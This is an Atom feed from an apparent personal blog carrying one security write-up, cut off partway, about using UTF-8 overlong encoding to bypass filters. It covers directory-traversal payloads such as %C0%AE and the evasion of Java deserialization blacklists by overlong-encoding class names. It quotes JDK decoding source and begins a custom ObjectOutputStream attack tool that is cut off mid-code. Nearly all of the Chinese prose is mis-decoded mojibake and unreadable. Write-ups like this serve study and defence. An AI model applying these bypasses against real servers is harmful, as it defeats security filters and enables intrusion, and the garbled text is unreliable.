<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>clown</title>
  
  <subtitle>clownçš„ç«™ç‚¹</subtitle>
  <link href="https://clowsman.github.io/atom.xml" rel="self"/>
  
  <link href="https://clowsman.github.io/"/>
  <updated>2024-10-22T14:14:03.669Z</updated>
  <id>https://clowsman.github.io/</id>
  
  <author>
    <name>clown</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UTF-8 Overlong Encodingç»•è¿‡å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-10-20T12:39:41.000Z</published>
    <updated>2024-10-22T14:14:03.669Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰åªæ˜¯æµ…æµ…çš„çŸ¥é“è¿™ä¸ªä¸œè¥¿ï¼Œç°åœ¨æ¥æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨javaé¢˜ç›®ä¸­æœ‰æ—¶ä¼šç”¨åˆ°è¯¥æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</p><h1 id="utf-8ç¼–ç è¿‡ç¨‹"><a href="#UTF-8ç¼–ç è¿‡ç¨‹" class="headerlink" title="UTF-8ç¼–ç è¿‡ç¨‹"></a>UTF-8ç¼–ç è¿‡ç¨‹</h1><p>UTF-8ï¼ˆ8-bit Unicode Transformation Formatï¼‰æ˜¯ä¸€ç§ç”¨äºç¼–ç Unicodeå­—ç¬¦çš„å¯å˜é•¿åº¦å­—ç¬¦ç¼–ç æ–¹æ¡ˆã€‚å®ƒèƒ½å¤Ÿè¡¨ç¤ºUnicodeå­—ç¬¦é›†ä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä¸ASCIIç¼–ç å…¼å®¹ã€‚</p><p>å®ƒå¯ä»¥å°†Unicodeé‡Œçš„æ‰€æœ‰å­—ç¬¦è½¬æ¢æˆ1åˆ°4ä¸ªå­—èŠ‚æ¥è¡¨ç¤º</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªUnicodeå¯¹åº”UTF-8çš„è½¬æ¢è¡¨</p><p><img src="https://cdn.clown2024.cn/202410202132477.png" alt="image-20241020213226571"></p><ul><li>å¸¸è§çš„ASCIIå­—ç¬¦ï¼ˆU+0000åˆ°U+007Fï¼‰ç”¨1ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</li><li>å…¶ä»–Unicodeå­—ç¬¦æ ¹æ®å…¶èŒƒå›´ä½¿ç”¨2åˆ°4ä¸ªå­—èŠ‚ã€‚</li></ul><p>ä»¥æ¬§å…ƒç¬¦å·â‚¬æ¥ä¸¾ä¾‹ï¼Œè¯¥ç¬¦å·çš„Unicodeç¼–ç ä¸ºU+20ACï¼Œä½äºU+0800å’ŒU+FFFFä¹‹é—´ï¼Œæ‰€ä»¥ä¸ºä¸‰ä¸ªå­—èŠ‚ï¼Œç¼–ç é•¿åº¦ä¸º3ï¼Œ0x20ACçš„äºŒè¿›åˆ¶ä¸º<strong>10 0000 1010 1100</strong></p><p>ç„¶åæ ¹æ®æ¯ä¸ªå­—èŠ‚ç¼ºçš„ä½æ•°ï¼Œä»å·¦è‡³å³æŒ‰é¡ºåºåˆ†æˆä¸‰ç»„ï¼Œç¬¬ä¸€ç»„é•¿åº¦ä¸æ»¡åœ¨å‰é¢è¡¥é›¶ï¼š0010ï¼Œ000010ï¼Œ101100</p><p>ç„¶åå¡«è¿›å»ï¼Œè½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œæ¬§å…ƒç¬¦å·çš„UTF-8ç¼–ç å°±æ˜¯<strong>\xE2\x82\xAC</strong></p><p>pythonæ¥decodeéªŒè¯ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410202147505.png" alt="image-20241020214652039"></p><h1 id="overlong-encodingç»•è¿‡åŸç†"><a href="#Overlong-Encodingç»•è¿‡åŸç†" class="headerlink" title="Overlong Encodingç»•è¿‡åŸç†"></a>Overlong Encodingç»•è¿‡åŸç†</h1><p>Overlong Encodingå°±æ˜¯å°†ä¸€ä¸ªå­—èŠ‚çš„å­—ç¬¦æŒ‰ç…§UTF-8çš„ç¼–ç å½¢å¼å¼ºè¡Œç¼–ç æˆä¸¤ä¸ªå­—ç¬¦</p><p>æ¯”å¦‚â€.â€è¿™ä¸ªå­—ç¬¦æ­£å¸¸Unicodeç¼–ç ä¸º0x2Eï¼ŒæŒ‰ç…§utf-8çš„å½¢å¼åªèƒ½è¢«ç¼–ç ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸¤ä¸ªå­—èŠ‚çš„ç¼–ç å½¢å¼ï¼Œé€šè¿‡è¡¥0å¼ºè¡Œåˆ†æˆä¸¤ç»„</p><p>0x2Eçš„äºŒè¿›åˆ¶æ˜¯10 1110ï¼Œç°åœ¨ç›´æ¥å‰é¢è¡¥5ä¸ª0ï¼Œå˜æˆ00000 101110è¿™æ ·çš„ä¸¤ç»„ï¼Œç„¶åä»–çš„UTF-8çš„ç¼–ç å½¢å¼å°±å˜æˆ<strong>\xC0\xAE</strong></p><p>ä½†æ˜¯è¿™ä¸ªç¼–ç å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„UTF-8ç¼–ç ï¼Œæœ‰äº›è¯­è¨€åœ¨è½¬æ¢çš„æ—¶å€™ä¼šè¿›è¡Œæ£€æŸ¥æ¯”å¦‚pythonï¼›è€Œæœ‰äº›åˆ™å¯¹è¯¥æ£€æŸ¥å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´èƒ½å¤Ÿæ­£å¸¸è§£æå‡ºæ¥ï¼Œæ¯”å¦‚javaï¼Œè¿™å°±é€ æˆ<strong>Overlong Encodingç»•è¿‡</strong></p><p>pythonè¿›è¡Œè§£ç çš„è¯ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202410202204297.png" alt="image-20241020220411264"></p><p>ä¼šç›´æ¥è¯´éæ³•å­—èŠ‚ï¼Œæ— æ³•è½¬æ¢ç¼–ç </p><p>è¯¥ç»•è¿‡æ–¹å¼ä¼šåœ¨ä¸€äº›ç›®å½•ç©¿è¶Šçš„æ—¶å€™ç”¨åˆ°ï¼Œæ¯”å¦‚ç”¨%C0%AEæ¥ä»£æ›¿.ï¼Œæ¥ç»•è¿‡å¯¹ç›®å½•ç©¿è¶Šçš„é™åˆ¶ï¼ŒåŸå› å°±æ˜¯è¯¥æœåŠ¡åœ¨è·¯å¾„è§£ç æ—¶ä½¿ç”¨UTF-8ç¼–ç </p><h1 id="overlong-encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨"><a href="#Overlong-Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨" class="headerlink" title="Overlong Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨"></a>Overlong Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨</h1><p>åœ¨javaçš„wafä¸­é€šå¸¸æ˜¯æ£€æŸ¥åºåˆ—åŒ–çš„å­—èŠ‚æµä¸­æ˜¯å¦æœ‰æ•æ„Ÿç±»æ¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™resolveClassæ¥æ·»åŠ é»‘åå•ï¼Œå¦‚æœèƒ½å¤Ÿè¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–å¯èƒ½æœ‰æœºä¼šç»•è¿‡ä¸€äº›å…³é”®ç±»ï¼Œä½†å¦‚æœç¦ç”¨å¾—å¤ªæ­»å°±è½®åˆ°Overlong Encodingæ–¹æ³•æ¥å¤§æ˜¾èº«æ‰‹äº†ã€‚</p><h2 id="ç»•è¿‡åˆ†æ"><a href="#ç»•è¿‡åˆ†æ" class="headerlink" title="ç»•è¿‡åˆ†æ"></a>ç»•è¿‡åˆ†æ</h2><p>æˆ‘ä»¬çŸ¥é“åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œç±»åæ˜¯ç›´æ¥æ˜æ–‡å¯è¯»ï¼Œwafæ£€æµ‹ä¹Ÿæ˜¯åŸºäºæ­¤å½¢å¼ï¼Œé‚£ç»•è¿‡çš„æ€è·¯å°±æ˜¯åˆ©ç”¨Overlong Encodingæ¥ç¼–ç è¿™äº›ç±»åï¼Œè®©å…¶ä¸å¯è§ä»è€Œç»•è¿‡æ£€æµ‹</p><p>é‚£ç°åœ¨å°±å»çœ‹çœ‹javaååºåˆ—åŒ–æ—¶æ˜¯æ€ä¹ˆè¯»å–ç±»åï¼Œåˆ†æä¸ºä»€ä¹ˆæˆ‘ä»¬å¯ä»¥ç»•è¿‡</p><p>è¿™é‡Œå°è¯•è‡ªå·±è°ƒäº†ä¸€ä¸‹ï¼Œå‘ç°ä¸å¤ªå¥½è°ƒ(ä¸»è¦æ˜¯å¤ªèœäº†ğŸ¥²)ï¼Œ1ueå¸ˆå‚…çš„æ–‡ç« ç»™å‡ºäº†è°ƒç”¨æ ˆï¼Œå°±ä¸é‡å¤´è‡ªå·±è°ƒäº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectStreamClass#readNonProxy(ObjectInputStream in)<br>ObjectInputStream#readUTF()<br>BlockDataInputStream#readUTF()<br>ObjectInputStream#readUTFBody(long utflen)<br>ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen)<br></code></pre></td></tr></table></figure><p>ç›´æ¥æ–­åœ¨readNonProxyæ–¹æ³•çš„è°ƒç”¨å¤„</p><p><img src="https://cdn.clown2024.cn/202410202345526.png" alt="image-20241020234544465"></p><p>çœ‹ä¸€ä¸‹ideaçš„è°ƒç”¨æ ˆï¼Œå¤§æ¦‚çŸ¥é“ä¸€ä¸‹æ€ä¹ˆæ¥åˆ°è¿™é‡Œçš„</p><p><img src="https://cdn.clown2024.cn/202410202346567.png" alt="image-20241020234623530"></p><p>ç„¶åè·Ÿè¿›readNonProxyæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410202347133.png" alt="image-20241020234726090"></p><p>å¯ä»¥çœ‹åˆ°ç±»åçš„è¯»å–å°±æ˜¯ç”¨readUTFæ–¹æ³•</p><p>ç„¶åç›´æ¥èµ°åˆ°æ¯”è¾ƒå…³é”®çš„ObjectInputStream#readUTFBodyæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410202354104.png" alt="image-20241020235420062"></p><p>æœ€åçš„è¯»å–å®ç°é€»è¾‘å°±åœ¨è¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•é‡Œé¢è¯»å–å­—èŠ‚çš„å…³é”®é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œçœ‹å…¶ä¸­ä¸€ä¸ªå³å¯</p><p>è¿™é‡Œçœ‹ä¸€ä¸‹readUTFSpanæ–¹æ³•çš„é€»è¾‘ï¼Œè¯¥æ–¹æ³•å°±æ˜¯æ ¹æ®utflenå»è·å–classnameçš„å€¼å¹¶è¿”å›åˆ°sbufä¸­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-title function_">readUTFSpan</span><span class="hljs-params">(StringBuilder sbuf, <span class="hljs-type">long</span> utflen)</span><br>            <span class="hljs-keyword">throws</span> IOException<br>        &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cpos</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> pos;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">avail</span> <span class="hljs-operator">=</span> Math.min(end - pos, CHAR_BUF_SIZE);<br>            <span class="hljs-comment">// stop short of last char unless all of utf bytes in buffer</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">stop</span> <span class="hljs-operator">=</span> pos + ((utflen &gt; avail) ? avail - <span class="hljs-number">2</span> : (<span class="hljs-type">int</span>) utflen);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">outOfBounds</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> (pos &lt; stop) &#123;<br>                    <span class="hljs-type">int</span> b1, b2, b3;<br>                    b1 = buf[pos++] &amp; <span class="hljs-number">0xFF</span>;<br>                    <span class="hljs-keyword">switch</span> (b1 &gt;&gt; <span class="hljs-number">4</span>) &#123;<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:   <span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:<br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">13</span>:  <span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>                            b2 = buf[pos++];<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">case</span> <span class="hljs-number">14</span>:  <span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>                            b3 = buf[pos + <span class="hljs-number">1</span>];<br>                            b2 = buf[pos + <span class="hljs-number">0</span>];<br>                            pos += <span class="hljs-number">2</span>;<br>                            <span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>                                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                            &#125;<br>                            cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>                                                   ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>                                                   ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br>                            <span class="hljs-keyword">break</span>;<br><br>                        <span class="hljs-keyword">default</span>:  <span class="hljs-comment">// 10xx xxxx, 1111 xxxx</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (ArrayIndexOutOfBoundsException ex) &#123;<br>                outOfBounds = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (outOfBounds || (pos - start) &gt; utflen) &#123;<br>                    <span class="hljs-comment">/*</span><br><span class="hljs-comment">                     * Fix for 4450867: if a malformed utf char causes the</span><br><span class="hljs-comment">                     * conversion loop to scan past the expected end of the utf</span><br><span class="hljs-comment">                     * string, only consume the expected number of utf bytes.</span><br><span class="hljs-comment">                     */</span><br>                    pos = start + (<span class="hljs-type">int</span>) utflen;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>                &#125;<br>            &#125;<br><br>            sbuf.append(cbuf, <span class="hljs-number">0</span>, cpos);<br>            <span class="hljs-keyword">return</span> pos - start;<br>        &#125;<br></code></pre></td></tr></table></figure><p>é‡Œé¢åˆ†åˆ«å¯¹1å­—èŠ‚ã€2å­—èŠ‚ã€3å­—èŠ‚çš„å½¢å¼è¿›è¡Œäº†å¤„ç†ï¼Œå¯¹å­—èŠ‚æ ¼å¼çš„åˆ¤æ–­æ˜¯é€šè¿‡b1çš„é«˜å››ä½æ¥ç¡®å®šçš„</p><p><strong>1å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1 byte format: 0xxxxxxx</span><br>cbuf[cpos++] = (<span class="hljs-type">char</span>) b1;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„å¤„ç†å¾ˆç®€å•ï¼Œç›´æ¥å°†b1å­—èŠ‚å€¼è½¬æ¢æˆå­—ç¬¦</p><p><strong>2å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 2 byte format: 110xxxxx 10xxxxxx</span><br>b2 = buf[pos++];<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>     <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x1F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>        ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ç¬¬äºŒä¸ªå­—èŠ‚æ˜¯å¦ç¬¦åˆæ ¼å¼ï¼Œç„¶ååˆå¹¶ä¸¤ä¸ªå­—èŠ‚ç”Ÿæˆå­—ç¬¦</p><p>é¦–å…ˆæ ¹æ®b1é«˜å››ä½ä¸º12æˆ–è€…13ï¼ŒçŸ¥é“b1çš„å‰å››ä½åªèƒ½ä¸º1100æˆ–1101ï¼Œä¹Ÿå°±æ˜¯å‰ä¸‰ä½å›ºå®šä¸º110ï¼›b2ä¸ä¸Š0xc0ä¸€å®šè¦ä¸º0x80ï¼Œæ‰€ä»¥b2å‰ä¸¤ä½ä¸€å®šä¸º10ï¼›</p><p>ç„¶ååœ¨è½¬æ¢å­—ç¬¦çš„æ—¶å€™ï¼Œç”±b1å­—èŠ‚çš„æœ€åä¸¤ä½å’Œb2çš„åå…­ä½æ„æˆå­—ç¬¦çš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯unicodeçš„ä»£ç ç‚¹ï¼Œæœ€åè¯»å–å‡ºæˆ‘ä»¬çš„å­—ç¬¦</p><p>b1&amp;0x1Fçš„ä½œç”¨å°±æ˜¯å»é™¤å‰ç¼€110ï¼ŒåŒæ ·çš„b2&amp;0x3Fçš„ä½œç”¨å°±æ˜¯å»é™¤å‰ç¼€10</p><blockquote><p>è¿™é‡Œæœ‰ä¸ªæ¯”è¾ƒé‡è¦çš„åœ°æ–¹ï¼Œå°±æ˜¯intç±»å‹çš„ç§»ä½</p><p>å› ä¸ºä¸€å¼€å§‹ä¹ æƒ¯æ€§çš„è®¤ä¸ºè¶…å‡º8ä½ä¼šè¢«æˆªæ–­ï¼Œåæ¥ä¸€æƒ³å¦‚æœåªæœ‰8ä½æ€ä¹ˆè¡¨ç¤ºunicodeå­—ç¬¦è¿™ä¹ˆå¤§çš„ä»£ç ç‚¹å‘¢</p><p>åæ¥å°±çŸ¥é“äº†intç±»å‹å› ä¸ºæ˜¯32ä½ï¼Œä»–æ˜¯æŒ‰ç…§32ä½æ¥ç§»ä½çš„ï¼Œæ‰€ä»¥ä¸Šé¢çš„ç§»ä½æ“ä½œå¹¶ä¸ä¼šå‘ç”Ÿæˆªæ–­ï¼Œä¹Ÿå°±æ˜¯æ¯”å¦‚ï¼š00010100å·¦ç§»äº”ä½æ˜¯10100 00000ï¼Œè¿™æ˜¯æŒ‰ç…§32ä½æ¥çš„ï¼Œè¿™æ ·ä¸Šé¢çš„åˆå¹¶æ“ä½œçœ‹èµ·æ¥å°±åˆç†äº†</p></blockquote><p>å¦‚æœæƒ³è¦ç”¨ä¸¤ä¸ªå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦æ¯”å¦‚oçš„è¯ï¼Œ<strong>oçš„äºŒè¿›åˆ¶ä¸º01101111</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¦æ±‚å°†å…¶æ‰©å……æˆä¸¤å­—èŠ‚UTF-8çš„ç¼–ç </p><p>æ ¹æ®ä¸Šé¢å¯çŸ¥ï¼Œb1ä¿ç•™äº†è‡ªå·±çš„ä¸­é—´3ä½ï¼Œå½¢å¼ä¸º 110+ä¸‰ä½+è¦åˆå¹¶çš„ä¸¤ä½ï¼Œb2å°±æ˜¯b1çš„åä¸¤ä½åŠ ä¸Šè‡ªå·±çš„å6ä½ï¼Œæ‰€ä»¥è¿™å…­ä½å¾ˆå®¹æ˜“çŸ¥é“æ˜¯å›ºå®šçš„ï¼Œb2çš„å‰ç¼€ä¸€å®šä¸º10ï¼Œæ‰€ä»¥b2å°±æ˜¯å›ºå®šçš„æ²¡åŠæ³•å˜åŒ–</p><p>ç„¶åæˆ‘ä»¬æƒ³è½¬å­—ç¬¦çš„è¯ï¼Œç”±äºå­—æ¯çš„Unicodeç¼–ç æ˜¯0-127ï¼Œæ‰€ä»¥ç¬¬ä¸€ä½å­—èŠ‚è‚¯å®šä¸º0ï¼Œå¦‚æœæˆ‘ä»¬è¦å¾—åˆ°è¿™ç§å½¢å¼ï¼Œé‚£ä¹ˆb1çš„ä¸­é—´3ä½ä¸€å®šå¾—ä¸º0ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œåˆå¹¶çš„ä¸¤ä½å°±æ˜¯æˆ‘ä»¬oå­—ç¬¦çš„å‰ä¸¤ä½</p><p>æ‰€ä»¥oè½¬æ¢æˆèƒ½å¤Ÿè§£æçš„äºŒè¿›åˆ¶å½¢å¼å°±ä¸ºï¼š11000001 10101111ï¼Œå›ºå®šä¸º\xC1\xAF</p><p><strong>3å­—èŠ‚å¤„ç†ï¼š</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx</span><br>b3 = buf[pos + <span class="hljs-number">1</span>];<br>b2 = buf[pos + <span class="hljs-number">0</span>];<br>pos += <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> ((b2 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span> || (b3 &amp; <span class="hljs-number">0xC0</span>) != <span class="hljs-number">0x80</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UTFDataFormatException</span>();<br>&#125;<br>cbuf[cpos++] = (<span class="hljs-type">char</span>) (((b1 &amp; <span class="hljs-number">0x0F</span>) &lt;&lt; <span class="hljs-number">12</span>) |<br>         ((b2 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">6</span>) |<br>         ((b3 &amp; <span class="hljs-number">0x3F</span>) &lt;&lt; <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure><p>åŒæ ·æ£€æŸ¥åä¸¤ä¸ªå­—èŠ‚ç„¶ååˆå¹¶ç”Ÿæˆå­—ç¬¦ï¼Œæœ‰å‰é¢åˆ†æ2å­—èŠ‚å¤„ç†çš„åŸºç¡€ï¼Œåˆ†æ3å­—èŠ‚çš„å¤„ç†ä¹Ÿå°±ç®€å•å¾ˆå¤šäº†</p><p>é¦–å…ˆb1å³ç§»4ä½ç­‰äº14ï¼Œå³å‰ç¼€ä¸€å®šæ˜¯1110ï¼Œç„¶åå°±æ˜¯åˆ¤æ–­b2ã€b3å‰ç¼€æ˜¯å¦ä¸º10</p><p>åˆå¹¶çš„é€»è¾‘å°±æ˜¯ï¼šb1å»é™¤å‰ç¼€å·¦ç§»12ä½ï¼Œb2å»é™¤å‰ç¼€å·¦ç§»6ä½ï¼Œb3å»é™¤å‰ç¼€ä¸ç§»ä½</p><p>ç„¶åå°±æ˜¯æƒ³è¦ä¸‰å­—èŠ‚åˆå¹¶ä¸ºä¸€ä¸ªasciiå­—ç¬¦æœ‰ä»€ä¹ˆè¦æ±‚äº†</p><ul><li>b1ï¼šä¸ºå‰ç¼€1110 + 0000ï¼Œå›ºå®šäº†</li><li>b3ï¼šæ²¡æœ‰ç§»ä½ä¹Ÿæ˜¯å›ºå®šçš„ï¼Œå°±æ˜¯10+æˆ‘ä»¬è¦è½¬åŒ–çš„å­—ç¬¦çš„åå…­ä½</li><li>b2ï¼š100000 + å­—ç¬¦å‰ä¸¤ä½</li></ul><p>ä¾‹å¦‚ç”¨b1ï¼Œb2ï¼Œb3è¡¨ç¤ºjå­—ç¬¦ï¼š11100000 10000001 10101010</p><h2 id="è½¬æ¢ä¸ºoverlong-encoding"><a href="#è½¬æ¢ä¸ºOverlong-Encoding" class="headerlink" title="è½¬æ¢ä¸ºOverlong Encoding"></a>è½¬æ¢ä¸ºOverlong Encoding</h2><p>é‚£ä¹ˆåº”è¯¥å¯¹ç±»è¿›è¡Œè½¬æ¢å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥æƒ³åˆ°ç›´æ¥æš´åŠ›å°†æ‰€æœ‰åºåˆ—åŒ–å­—èŠ‚æµè¿›è¡Œæ›¿æ¢ï¼Œä½†ä¼šç ´åä¸€äº›éç±»åçš„ä¿¡æ¯ï¼Œå¯èƒ½å¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ï¼Œ<a href="https://xz.aliyun.com/u/81008"><strong>lzstar</strong></a>å¸ˆå‚…çš„æ–‡ç« ä¸­ç»™å‡ºäº†æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ç»§æ‰¿ObjectOutputStreamé‡å†™é‡Œé¢çš„åºåˆ—åŒ–é€»è¾‘ï¼Œæ›´å‡†ç¡®çš„è¯´ï¼Œæ˜¯é‡å†™åºåˆ—åŒ–ç±»åçš„æ–¹æ³•</p><p>å¸ˆå‚…çš„é‡å†™æ€è·¯å°±æ˜¯ç»§æ‰¿ObjectOutputStreamï¼Œé‡å†™writeClassDescriptoræ–¹æ³•ï¼Œåœ¨writeClassDescriptoræ–¹æ³•ä¸­å®ç°desc.writeNonProxy(this)æ–¹æ³•çš„é€»è¾‘å’Œå°†ç±»åOverlong Encodingçš„é€»è¾‘ï¼Œå…·ä½“æ“ä½œçš„è¯å°±æ˜¯ç›´æ¥å°†desc.writeNonProxy(this)æ–¹æ³•çš„é€»è¾‘å¤åˆ¶è¿›å»ï¼Œç¼ºå°‘çš„å±æ€§å¯ä»¥é€šè¿‡åå°„è·å–ï¼Œç¼ºå°‘çš„æ–¹æ³•å¯ä»¥é€šè¿‡åå°„è°ƒç”¨ï¼Œä¹‹ååœ¨é‡Œé¢åŠ ä¸ŠOverlong Encodingçš„é€»è¾‘å°±å¯ä»¥äº†ã€‚</p><p>ç›´æ¥è´´å¸ˆå‚…çš„ä»£ç äº†è¿™é‡Œï¼Œè†œæ‹œä½¬orz</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * å‚è€ƒpç¥ï¼šhttps://mp.weixin.qq.com/s/fcuKNfLXiFxWrIYQPq7OCg</span><br><span class="hljs-comment"> * å‚è€ƒ1ueï¼šhttps://t.zsxq.com/17LkqCzk8</span><br><span class="hljs-comment"> * å®ç°ï¼šå‚è€ƒ OObjectOutputStream# protected void writeClassDescriptor(ObjectStreamClass desc)æ–¹æ³•</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomObjectOutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomObjectOutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span 